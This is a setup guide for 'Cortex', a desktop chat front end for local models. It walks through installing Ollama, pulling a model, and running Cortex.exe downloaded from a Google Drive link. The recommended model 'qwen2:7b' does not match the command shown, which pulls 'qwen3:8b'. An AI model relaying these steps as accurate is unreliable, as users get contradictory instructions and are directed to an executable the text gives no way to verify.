## Getting Started with Cortex

Welcome to Cortex! While setting up a local AI application might seem intimidating at first, this guide breaks it down into simple steps. The process to install the necessary components and download a model is very straightforward and requires no technical expertise.

### Overview

Cortex is a desktop application that provides an interface for interacting with powerful language models. To function, it relies on a background service called Ollama, which manages and runs these models locally on your machine.

### System Requirements

Before you begin, please ensure your computer meets the following requirements:

*   **Operating System:** Windows, macOS, or Linux.
*   **Storage:** At least 10 GB of free hard drive space is recommended to start. **Note:** The language models required by this program can be very large, ranging from 4 GB to over 100 GB. Please verify you have sufficient disk space before downloading a model.
*   **Memory (RAM):** A minimum of 8 GB of RAM is required, but 16 GB or more is highly recommended for a smoother experience, especially with larger models.

---

### Installation and Setup

Follow these three steps carefully to get Cortex running.

#### Step 1: Install Ollama

Cortex cannot run without Ollama. Think of Ollama as the engine that powers the application. This is a simple, one-time installation.

1.  Visit the official Ollama website: [https://ollama.com](https://ollama.com)
2.  Download the installer for your operating system (Windows, macOS, or Linux).
3.  Run the installer and follow the on-screen instructions.
4.  Once installed, Ollama will run in the background. You should see its icon in your system tray (usually at the bottom-right on Windows or top-right on macOS).

#### Step 2: Download a Language Model

Next, you need to download a model. The model is the "brain" that Cortex interacts with. This is done with a single command.

1.  Open your computer's command line application:
    *   **On Windows:** Search for `Command Prompt` or `PowerShell` in the Start Menu and open it.
    *   **On macOS or Linux:** Search for `Terminal` and open it.

2.  In the command line window, type the following command and press Enter. We recommend starting with the `qwen2:7b` model, which offers a great balance of performance and size.

    ```
    ollama run qwen3:8b
    ```

3.  Ollama will begin downloading the model. This may take some time depending on your internet speed and the model's size. You will see a progress bar.

4.  Once the download is complete, you can close the command line window. You can browse for other models to download on the [Ollama Model Library](https://ollama.com/library).

**Important:** Each model you download will consume significant hard drive space. Always check the model size in the library before downloading.

#### Step 3: Download and Run Cortex

Now you are ready to download the main application.

1.  Download the Cortex application from the following link:
    *   **[Download Cortex.exe (65 MB)](https://drive.google.com/file/d/1BF4O7Hy1o5H9nkPzUjmsVsdi1Pt-VEYa/view)**

2.  Save the `Cortex.exe` file to a convenient location, such as your Desktop or a new folder.

3.  Ensure Ollama is running in the background (check for its icon in your system tray).

4.  Double-click `Cortex.exe` to launch the application.

You are now ready to use Cortex. The application will automatically detect the models you have downloaded via Ollama.

---

### Common Issues

*   **"Ollama is not running."**
    *   Make sure you have installed Ollama and that it is active. Try restarting the Ollama application or your computer.

*   **"No models found."**
    *   This means you have not yet downloaded a model. Please follow the instructions in **Step 2: Download a Language Model**.

*   **The application is running slowly.**
    *   The performance of Cortex depends heavily on your computer's hardware (RAM and CPU/GPU) and the size of the model you are using. Larger models require more powerful computers to run efficiently. Consider using a smaller model for better performance.
